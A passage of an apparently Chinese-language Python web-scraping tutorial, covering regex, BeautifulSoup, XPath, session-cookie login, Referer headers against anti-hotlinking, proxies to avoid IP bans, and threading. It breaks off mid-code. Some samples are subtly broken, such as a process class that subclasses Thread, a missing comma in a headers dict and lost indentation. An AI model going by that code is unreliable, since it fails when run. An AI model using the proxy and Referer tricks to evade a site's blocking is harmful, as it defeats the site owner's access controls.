差不多，只不过返回的是迭代器（重点）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">it = re.finditer(<span class="hljs-string">&quot;m&quot;</span>,<span class="hljs-string">&quot;mai le fo len,mai ni mei!&quot;</span>)<br><span class="hljs-keyword">for</span> el <span class="hljs-keyword">in</span> it:<br><span class="hljs-built_in">print</span>(el.group()) <span class="hljs-comment"># 依然需要分组</span><br></code></pre></td></tr></table></figure><h3 id="Compile">Compile</h3><p><code>compile()</code> 可以将⼀个⻓⻓的正则进⾏预加载. ⽅便后⾯的使⽤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">obj = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;\d&#123;3&#125;&#x27;</span>) <span class="hljs-comment"># 将正则表达式编译成为</span><br>⼀个 正则表达式对象, 规则要匹配的是<span class="hljs-number">3</span>个数字<br>ret = obj.search(<span class="hljs-string">&#x27;abc123eeee&#x27;</span>) <span class="hljs-comment"># 正则表达式对象调</span><br>⽤search, 参数为待匹配的字符串<br><span class="hljs-built_in">print</span>(ret.group()) <span class="hljs-comment"># 结果: 123</span><br></code></pre></td></tr></table></figure><h3 id="正则中的内容如何单独提取">正则中的内容如何单独提取?</h3><p>单独获取到正则中的具体内容可以给分组起名字，来获取对应的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;div class=&#x27;⻄游记&#x27;&gt;&lt;span id=&#x27;10010&#x27;&gt;中国联通&lt;/span&gt;&lt;/div&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>obj = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;&lt;span id=&#x27;(?P&lt;id&gt;\d+)&#x27;&gt;(?P&lt;name&gt;\w+)&lt;/span&gt;&quot;</span>, re.S)<br>result = obj.search(s)<br><span class="hljs-built_in">print</span>(result.group()) <span class="hljs-comment"># 结果: &lt;span id=&#x27;10010&#x27;&gt;中国联通&lt;/span&gt;</span><br><span class="hljs-built_in">print</span>(result.group(<span class="hljs-string">&quot;id&quot;</span>)) <span class="hljs-comment"># 结果: 10010 # 获取id组的内容</span><br><span class="hljs-built_in">print</span>(result.group(<span class="hljs-string">&quot;name&quot;</span>)) <span class="hljs-comment"># 结果: 中国联通 # 获取name组的内容</span><br></code></pre></td></tr></table></figure><p>这⾥可以看到我们可以通过使⽤分组. 来对正则匹配到的内容进⼀步的进⾏筛选</p><h3 id="练习代码">练习代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># findall: 匹配字符串中所有符合正则的内容</span><br>lst = re.findall(<span class="hljs-string">r&quot;\d+&quot;</span>, <span class="hljs-string">&quot;我的电话是：10086，我女朋友的电话是：10010&quot;</span>)<br><span class="hljs-built_in">print</span>(lst)<br><br><span class="hljs-comment"># finditer: 匹配字符串中所有的内容[返回的是迭代器],从迭代器中拿到内容需要 .group()</span><br>it = re.finditer(<span class="hljs-string">r&quot;\d+&quot;</span>, <span class="hljs-string">&quot;我的电话是：10086，我女朋友的电话是：10010&quot;</span>)<br><span class="hljs-built_in">print</span>(it)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> it:<br>    <span class="hljs-built_in">print</span>(i.group())<br><br><span class="hljs-comment"># search：全文匹配找到一个结果就返回,返回的结果是match,从中拿到内容需要 .group()</span><br>s = re.search(<span class="hljs-string">r&quot;\d+&quot;</span>, <span class="hljs-string">&quot;我的电话是：10086，我女朋友的电话是：10010&quot;</span>)<br><span class="hljs-built_in">print</span>(s.group())<br><br><span class="hljs-comment"># match: 从头开始匹配</span><br>s = re.match(<span class="hljs-string">r&quot;\d+&quot;</span>, <span class="hljs-string">&quot;我的电话是：10086，我女朋友的电话是：10010&quot;</span>)  <span class="hljs-comment"># success</span><br><span class="hljs-built_in">print</span>(s.group())<br>s = re.match(<span class="hljs-string">r&quot;\d+&quot;</span>, <span class="hljs-string">&quot;r我的电话是：10086，我女朋友的电话是：10010&quot;</span>)  <span class="hljs-comment"># wrong</span><br><span class="hljs-built_in">print</span>(s.group())<br><br><span class="hljs-comment"># 预加载正则表达式</span><br>obj = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;\d+&quot;</span>)<br>ret = obj.finditer(<span class="hljs-string">&quot;我的电话是：10086，我女朋友的电话是：10010&quot;</span>)<br><span class="hljs-keyword">for</span> it <span class="hljs-keyword">in</span> ret:<br>    <span class="hljs-built_in">print</span>(it.group())<br><br>ret = obj.findall(<span class="hljs-string">&quot;我的电话是：10086，我女朋友的电话是：10010&quot;</span>)<br><span class="hljs-built_in">print</span>(ret)<br><br>s = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;div class=&#x27;beijing&#x27;&gt;&lt;span id=&#x27;1&#x27;&gt;北京&lt;/span&gt;&lt;/div&gt;</span><br><span class="hljs-string">&lt;div class=&#x27;shanghai&#x27;&gt;&lt;span id=&#x27;1&#x27;&gt;上海&lt;/span&gt;&lt;/div&gt;</span><br><span class="hljs-string">&lt;div class=&#x27;chongming&#x27;&gt;&lt;span id=&#x27;1&#x27;&gt;崇明&lt;/span&gt;&lt;/div&gt;</span><br><span class="hljs-string">&lt;div class=&#x27;guangzhou&#x27;&gt;&lt;span id=&#x27;1&#x27;&gt;广州&lt;/span&gt;&lt;/div&gt;</span><br><span class="hljs-string">&lt;div class=&#x27;fujian&#x27;&gt;&lt;span id=&#x27;1&#x27;&gt;福建&lt;/span&gt;&lt;/div&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># (?P&lt;分组名字&gt;正则)可以单独从正则匹配的内容中提取到XXX名字的内容</span><br>obj = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;&lt;div class=&#x27;(.*?)&#x27;&gt;&lt;span id=&#x27;(.*?)&#x27;&gt;(.*?)&lt;/span&gt;&lt;/div&gt;&quot;</span>, re.S)  <span class="hljs-comment"># re.S 让.能匹配换行符</span><br>ret = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;&lt;div class=&#x27;(?P&lt;class&gt;.*?)&#x27;&gt;&lt;span id=&#x27;(?P&lt;id&gt;.*?)&#x27;&gt;(?P&lt;name&gt;.*?)&lt;/span&gt;&lt;/div&gt;&quot;</span>, re.S)<br><br>result = obj.finditer(s)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> result:<br>    <span class="hljs-built_in">print</span>(i.group())<br>    <span class="hljs-built_in">print</span>(i.group(<span class="hljs-string">&quot;name&quot;</span>))  <span class="hljs-comment"># 从name组里面拿取数据</span><br><br></code></pre></td></tr></table></figure><h2 id="BS4-模块使用">BS4 模块使用</h2><h3 id="bs4模块安装">bs4模块安装</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pip</span> install bs<span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><hr><p>在<code>bs4</code>模块中我们主要用到的是<code>BeautifulSoup</code>，通过<code>BeautifulSoup</code>我们可以导入网页的源代码进行分析，从而提取我们想要的数据。</p><p><strong>样例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br>resp =requests.get(url) <span class="hljs-comment"># 对指定url发起请求</span><br>page = BeautifulSoup(resp.text, <span class="hljs-string">&quot;html.parser&quot;</span>) <span class="hljs-comment"># BeautifulSoup对数据处理，并声明传入文本为html</span><br><span class="hljs-comment"># 比如我要找标签table，其class是hq_table</span><br>table = page.find(<span class="hljs-string">&quot;table&quot;</span>, class_=<span class="hljs-string">&quot;hq_table&quot;</span>) <span class="hljs-comment"># 找到table标签，且class是hq_table</span><br><span class="hljs-comment"># 提取到所有tr</span><br>tr_list = table.find_all(<span class="hljs-string">&quot;tr&quot;</span>)<br><span class="hljs-keyword">for</span> tr <span class="hljs-keyword">in</span> tr_list:<br>td_list = tr.find_all(<span class="hljs-string">&quot;td&quot;</span>)<br>name = td_list[<span class="hljs-number">0</span>].text <span class="hljs-comment"># 获取⽂本内容</span><br>    <span class="hljs-built_in">print</span>(name)<br></code></pre></td></tr></table></figure><hr><p>如果想要找到<code>p</code>标签里的<code>img</code>标签呢？我们可以使用<code>find</code></p><p><strong>样例：</strong><code>img = p.find('img')</code></p><p>那我们想要获取<code>img</code>标签里的链接<code>src</code>那么我们可以再使用<code>get</code></p><p><strong>样例：</strong><code>src = img.get(&quot;src&quot;)</code></p><h2 id="XPath-模块使用">XPath 模块使用</h2><p><code>XPath</code>是⼀⻔在 <code>XML</code> ⽂档中查找信息的语⾔。<code>XPath</code>可⽤来在 <code>XML</code> ⽂档中对元素和属性进⾏遍历⽽我们熟知的<code>Html</code>恰巧属于<code>XML</code>的 ⼀个⼦集。 所以完全可以⽤<code>XPath</code>去查找<code>Html</code>中的内容。</p><h3 id="XPath-模块安装">XPath 模块安装</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> lxml<br></code></pre></td></tr></table></figure><h3 id="基本概念">基本概念</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">book</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>野花遍地⾹<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">price</span>&gt;</span>1.23<span class="hljs-tag">&lt;/<span class="hljs-name">price</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">nick</span>&gt;</span>周⼤强<span class="hljs-tag">&lt;/<span class="hljs-name">nick</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">nick</span>&gt;</span>周芷若<span class="hljs-tag">&lt;/<span class="hljs-name">nick</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">book</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在上述html中 :</p><ol><li>book, id, name, price…都被称为节点.</li><li>Id, name, price, author被称为book的⼦节点</li><li>book被称为id, name, price, author的⽗节点</li><li>id, name, price,author被称为同胞节点</li></ol><h3 id="基本使用">基本使用</h3><ol><li>将要解析的html内容构造出<code>etree</code>对象.</li><li>使⽤<code>etree</code>对象的<code>xpath()</code>⽅法配合<code>xpath</code>表达式来完成对数据的提取</li></ol><p><strong>样例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree<br><br>xml = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;book&gt;</span><br><span class="hljs-string">    &lt;id&gt;1&lt;/id&gt;</span><br><span class="hljs-string">    &lt;name&gt;野花遍地香&lt;/name&gt;</span><br><span class="hljs-string">    &lt;price&gt;1.23&lt;/price&gt;</span><br><span class="hljs-string">    &lt;nick&gt;臭豆腐&lt;/nick&gt;</span><br><span class="hljs-string">    &lt;author&gt;</span><br><span class="hljs-string">        &lt;nick id=&quot;beijing&quot;&gt;北京&lt;/nick&gt;</span><br><span class="hljs-string">        &lt;nick id=&quot;shanghai&quot;&gt;上海&lt;/nick&gt;</span><br><span class="hljs-string">        &lt;nick id=&quot;fujian&quot;&gt;福建&lt;/nick&gt;</span><br><span class="hljs-string">        &lt;nick id=&quot;tianjin&quot;&gt;天津&lt;/nick&gt;</span><br><span class="hljs-string">        &lt;nick id=&quot;yunnan&quot;&gt;云南&lt;/nick&gt;</span><br><span class="hljs-string">        &lt;div&gt;</span><br><span class="hljs-string">            &lt;nick id=&quot;chengdu&quot;&gt;成都&lt;/nick&gt;</span><br><span class="hljs-string">        &lt;/div&gt;</span><br><span class="hljs-string">    &lt;/author&gt;</span><br><span class="hljs-string">    &lt;partner&gt;</span><br><span class="hljs-string">        &lt;nick id=&quot;ppc&quot;&gt;碰碰车&lt;/nick&gt;</span><br><span class="hljs-string">        &lt;nick id=&quot;ppbc&quot;&gt;频频爆出&lt;/nick&gt;</span><br><span class="hljs-string">    &lt;/partner&gt;</span><br><span class="hljs-string">&lt;/book&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br>tree = etree.XML(xml)<br><span class="hljs-comment"># result = tree.xpath(&quot;/book&quot;) # /表示层级关系，第一个/是根节点</span><br><span class="hljs-comment"># result = tree.xpath(&quot;/book/name&quot;)</span><br><span class="hljs-comment"># result = tree.xpath(&quot;/book/name/text()&quot;)  # text() 拿文本</span><br><span class="hljs-comment">#  result = tree.xpath(&quot;/book/author//nick/text()&quot;) # // 后代</span><br><span class="hljs-comment"># result = tree.xpath(&quot;/book/author/*/nick/text()&quot;) # * 任意的节点，通配符</span><br>result = tree.xpath(<span class="hljs-string">&quot;/book//nick/text()&quot;</span>)<br><br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><h4 id="一些提取数据写法">一些提取数据写法</h4><p><code>[@class='xxx']</code>属性选取<br><code>text()</code>获取⽂本<br><code>@href</code>获取对应<code>href</code>里的数据<br><code>./</code>从上一个结点继续往下寻找</p><h2 id="Requests-处理-Cookie-模拟登录">Requests 处理 Cookie 模拟登录</h2><p>一般的请求方式如<code>requests.get()</code>和<code>requests.post()</code>在请求时不是连续的，在面对登录抓取的时候这就会陷入困境，因而我们引入一个<code>requests.session()</code></p><p><strong>样例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment"># 建⽴session</span><br>session = requests.session()<br><span class="hljs-comment"># 准备⽤户名密码</span><br>data = &#123;<br> <span class="hljs-string">&quot;loginName&quot;</span>: <span class="hljs-string">&quot;xxxxxx&quot;</span>,<br> <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;xxxxxx&quot;</span><br>&#125;<br><span class="hljs-comment"># UA</span><br>headers = &#123;<br> <span class="hljs-string">&quot;user-agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; IntelMac OS X 10_15_4) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/87.0.4280.141 Safari/537.36&quot;</span><br>&#125;<br><span class="hljs-comment"># 登录</span><br>resp =<br>session.post(url=url, data=data, headers=headers)<br><span class="hljs-comment"># cookie中的东⻄</span><br><span class="hljs-built_in">print</span>(session.cookies)<br><span class="hljs-comment"># 带着cookie请求书架</span><br>resp =session.get(url)<br><span class="hljs-built_in">print</span>(resp.text)<br></code></pre></td></tr></table></figure><h2 id="防盗链处理">防盗链处理</h2><p>在爬取有些网站时，会有对应的防盗链进行反爬取，本质原理上就是一个判定，判断你这个请求是由哪一个<code>url</code>所产生的，如果定位不到对应的<code>url</code>链接那么就会直接拒绝访问，我们对应的处理方式则是在<code>headers</code>里面加入一个<code>Referer</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">headers = &#123;<br> <span class="hljs-string">&quot;user-agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; IntelMac OS X 10_15_4) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/87.0.4280.141 Safari/537.36&quot;</span><br> <span class="hljs-string">&quot;Referer&quot;</span>:url <span class="hljs-comment"># 防盗链 意义:本次请求是由哪个url产⽣的</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="代理使用">代理使用</h2><p>当我们反复抓取⼀个⽹站时, 由于请求过于频繁, 服务器很可能会将你的IP进⾏封锁来反爬.。为了避免<code>IP</code>被服务器封锁，我们需要使用代理进行爬取。</p><p><strong>样例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>headers = &#123;<br> <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; IntelMac OS X 10_15_4) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/87.0.4280.141 Safari/537.36&quot;</span>,<br>&#125;<br>proxies = &#123;<br> <span class="hljs-string">&quot;https&quot;</span>: <span class="hljs-string">&quot;https://xxxx.xxxx.xxxx.xxxx&quot;</span><br>&#125;<br>resp = requests.get(<span class="hljs-string">&quot;https://www.baidu.com&quot;</span>,headers=headers, proxies=proxies) <span class="hljs-comment"># 以百度链接为例子</span><br><span class="hljs-built_in">print</span>(resp.text)<br></code></pre></td></tr></table></figure><p>**注：**代理IP⼀般属于灰⾊产业，故不深入讨论。</p><h2 id="多线程">多线程</h2><p>实现多线程我们需要导入包Thread</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br></code></pre></td></tr></table></figure><p>那么怎么实现呢？我们通过函数为一个线程，主函数一个线程而实现双线程。如果需要多线程，则可以添加多个函数。</p><p><strong>写法一：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span>():</span><br> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):<br> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;func&quot;</span>, i)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br> t = Thread(target=func)<br> t.start()<br> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):<br> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;main&quot;</span>, i)<br></code></pre></td></tr></table></figure><p><strong>写法二：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyThread</span>(<span class="hljs-params">Thread</span>):</span><br> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self</span>):</span><br> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):<br> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;func&quot;</span>, i)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br> t = MyThread()<br> t.start()<br> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):<br> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;main&quot;</span>, i)<br><br></code></pre></td></tr></table></figure><h2 id="多进程">多进程</h2><p>多进程的写法与多线程十分相似，同样有两种写法，就不过多阐述了。</p><p><strong>写法一：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span>():</span><br> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):<br> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;func&quot;</span>, i)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br> t =  Process(target=func)<br> t.start()<br> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):<br> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;main&quot;</span>, i)<br></code></pre></td></tr></table></figure><p><strong>写法二：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyProcess</span>(<span class="hljs-params">Thread</span>):</span><br> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self</span>):</span><br> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):<br> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;func&quot;</span>, i)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br> t = MyProcess()<br> t.start()<br> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):<br> <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;main&quot;</span>, i)<br><br></code></pre></td></tr></table></figure><h2 id="线程锁">线程锁</h2><p>我们知道，不同进程之间的内存空间数据是不能够共享的，试想一下，如果可以随意共享，谈何安全？但是一个进程中的多个线程是可以共享这个进程的内存空间中的数据的，比如多个线程可以同时调用某一内存空间中的某些数据（只是调用，没有做修改）。</p><p>试想一下，在某一进程中，内存空间中存有一个变量对象的值为<code>num=8</code>，假如某一时刻有多个线程需要同时使用这个对象，出于这些线程要实现不同功能的需要，<code>线程A</code>需要将<code>num</code>减<code>1</code>后再使用，<code>线程B</code>需要将<code>num</code>加<code>1</code>后再使用，而<code>线程C</code>则是需要使用<code>num</code>原来的值<code>8</code>。由于这三个线程都是共享存储<code>num</code>值的内存空间的，并且这三个线程是可以同时并发执行的，当三个线程同时对<code>num</code>操作时，因为<code>num</code>只有一个，所以肯定会存在不同的操作顺序。</p><p>因此出于程序稳定运行的考虑，对于线程需要调用内存中的共享数据时，我们就需要为线程加锁。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">lock = threading.RLock()    <span class="hljs-comment"># 调用threading模块中的RLock()</span><br>lock.acquire()      <span class="hljs-comment"># 开始给线程加锁</span><br>lock.release()      <span class="hljs-comment"># 给线程解锁</span><br></code></pre></td></tr></table></figure><h2 id="线程池和进程池">线程池和进程池</h2><p>当我们对某些⽹站内容进⾏抓取的时候⾮常容易遇到这样⼀种情况，我们发现这⽹站的数据太多了。有⼀万多⻚， 也就对应着 ⼀万多个<code>url</code>。那我们设计多线程的时候如果每个<code>url</code>对应⼀个线程就会产⽣新问题。朋友，你⼀定要知道。创建线程本身也是要消耗你的计算机资源的。线程不是变魔术变出来的。那这时我们就可以考虑能不能重复的使⽤线程呢? 答案当然可以。线程池就可以帮你搞定。</p><h3 id="工作原理">工作原理</h3><p>创建⼀个⼤池⼦，存放固定数量的线程。然后把我们要执⾏的任务丢给线程池。由线程池去分配哪个线程来完成该任务。</p><h3 id="实现代码：">实现代码：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor, ProcessPoolExecutor<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fn</span>(<span class="hljs-params">name</span>):</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1000</span>):<br>        <span class="hljs-built_in">print</span>(name, i)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># 创建线程池</span><br>    <span class="hljs-keyword">with</span> ThreadPoolExecutor(<span class="hljs-number">50</span>) <span class="hljs-keyword">as</span> t:<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>            t.submit(fn, name=<span class="hljs-string">f&quot;线程<span class="hljs-subst">&#123;i&#125;</span>&quot;</span>)<br><br>    <span class="hljs-comment"># 创建进程池</span><br>    <span class="hljs-keyword">with</span> ProcessPoolExecutor(<span 